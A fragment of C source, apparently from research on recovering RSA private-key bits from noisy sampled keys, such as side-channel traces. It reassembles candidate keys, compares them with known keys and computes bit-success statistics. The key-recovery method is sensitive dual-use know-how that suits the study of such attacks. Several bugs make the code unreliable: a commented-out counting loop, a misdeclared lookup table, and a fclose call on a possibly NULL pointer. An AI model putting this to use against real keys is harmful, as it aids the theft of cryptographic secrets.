			BitsPadding = (MissingBits - FinalSkippedBitAverage - 1) >= 0 ? (MissingBits - FinalSkippedBitAverage - 1) : 0;
			pRealKey[(MissingBits - FinalSkippedBitAverage) / 8] |= (0b1 << (BITS_IN_CHAR - 1 - (BitsPadding % BITS_IN_CHAR)));

			for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
			{
				pRealKey[(Bit + MissingBits) / 8] |= ((pRealKeyBits[Bit] == '1') << (BITS_IN_CHAR - 1 - ((Bit + MissingBits) % BITS_IN_CHAR)));
			}

			for (j = 0;j < 2;j++){
				pRealKey[0] ^= 0x80;
				for (i = 0; i < NUMBER_OF_DIFFERENT_KEYS; i++){
					Equal = memcmp_dbg(pRealKey, RsaKeys[i], KEYS_LEN_IN_BITS / BITS_IN_CHAR);
					if (Equal == 0)
						break;
				}
				if (Equal == 0)
					break;
			}

			/*
			for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
			{
				printf("%08x", htonl(((int*)pRealKey)[ByteInKey]));
			}
			printf("\r\n");
			*/

		}
		if (Equal == 0){
			printf("The key is CORRECT!\r\n");
		} else {
			printf("The key is WRONG!\r\n");
		}

	} while (dbgContinue);

	free(pRealKeyBits);
	return pRealKey;
}

char* StringToBuff(char* String)
{
	int Len = strlen(String);
	char* pBuff = malloc(Len / 2);
	int i;

	for (i = 0; i < Len; i += 2)
	{
		char tmp = 0;

		if (String[i] >= 'a' && String[i] <= 'f')
			tmp = (String[i] - 'a') + 10;
		else
			tmp = String[i] - '0';

		tmp = (tmp << 4);

		if (String[i + 1] >= 'a' && String[i + 1] <= 'f')
			tmp |= (String[i + 1] - 'a') + 10;
		else
			tmp |= String[i + 1] - '0';

		pBuff[i / 2] = tmp;
	}

	return pBuff;
}



//Yakir & Naama functions

/*
 * char SampledKeys[KeysNum][KEYS_LEN_IN_BITS + MAX_HANDLED_EXTRA_BITS];
*/
void successBitRatio(char SampledKeys[][KEYS_LEN_IN_BITS + MAX_HANDLED_EXTRA_BITS],int KeysNum,int KeySkipIndex[], char RsaKey[KEYS_LEN_IN_BITS / 8], char writeToFiles){
	char RsaKeyAsBits[KEYS_LEN_IN_BITS];
	int sampleKey_i,i;
	int bit;
	FILE * probBitFile=NULL;
	float correct,total;
	short probs[KEYS_LEN_IN_BITS][2];			//[correct , couldn't find]
	RsaToStringBits(RsaKey , RsaKeyAsBits);
	if(writeToFiles){
		probBitFile = (FILE * )fopen("SuccessBitProb.txt","w");
	}
	memset(probs, 0, sizeof(probs));
	for(bit=0;bit<KEYS_LEN_IN_BITS;bit++){
		for(sampleKey_i=0;sampleKey_i<KeysNum;sampleKey_i++){
//			if(SampledKeys[sampleKey_i+KeySkipIndex[sampleKey_i]][bit]==RsaKeyAsBits[bit]){
//				probs[bit][0]++;
//			}else if(SampledKeys[sampleKey_i+KeySkipIndex[sampleKey_i]][bit]=='?'){
//				probs[bit][1]++;
//			}
		}
	}
	correct=total=0;
	//probability to find that its a correct bit given we could find a bit from it sample
	writeToFiles?fprintf(probBitFile,"prob correct bits / found bits:\r\n"):0;
	for(bit=0;bit<KEYS_LEN_IN_BITS;bit++){
		correct +=(float)probs[bit][0]/(float)(KeysNum - probs[bit][1]);
		writeToFiles?fprintf(probBitFile,"%f, ",(float)probs[bit][0]/(float)(KeysNum - probs[bit][1])):0;
	}
	writeToFiles?fprintf(probBitFile,"The probability to be correct given that we found bit: %f\r\n",correct/KEYS_LEN_IN_BITS):0;
	printf("The probability to be correct given that we found bit: %f\r\n",(float)(correct)/KEYS_LEN_IN_BITS);

	//probability to find that its a correct bit
	writeToFiles?fprintf(probBitFile,"prob correct bits:\r\n"):0;
	for(bit=0;bit<KEYS_LEN_IN_BITS;bit++){
		total+=(float)probs[bit][0]/(float)(KeysNum);
		writeToFiles?fprintf(probBitFile,"%f ",(float)(probs[bit][0])/(float)(KeysNum)):0;
	}

	writeToFiles?fprintf(probBitFile,"The probability to be correct : %f\r\n",total/KEYS_LEN_IN_BITS):0;
	printf("The probability to be correct given that we found bit: %f\r\n",correct/KEYS_LEN_IN_BITS);
	fclose(probBitFile);
	printf("bit ratio have been calculated.\r\n");
}


void RsaToStringBits(char RsaKey[KEYS_LEN_IN_BITS / 8],char RsaKeyAsBits[KEYS_LEN_IN_BITS]){
	int ByteInKey,i;
	static const char bytesInBinary[15][5]={"0000","0001","0010","0011","0100","0101","0110","0111","1000","1001","1010","1011","1100","1101","1110","1111"};
	RsaKeyAsBits[0]=0;
	for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
	{
		unsigned int mask;
		for( i=28,mask=0xF0000000;i>=0;i-=4,mask=mask>>4)
		{
			strcat(RsaKeyAsBits,bytesInBinary[(mask&((unsigned int)htonl(RsaKeys[ByteInKey])))>>i]);
		}
	}
}
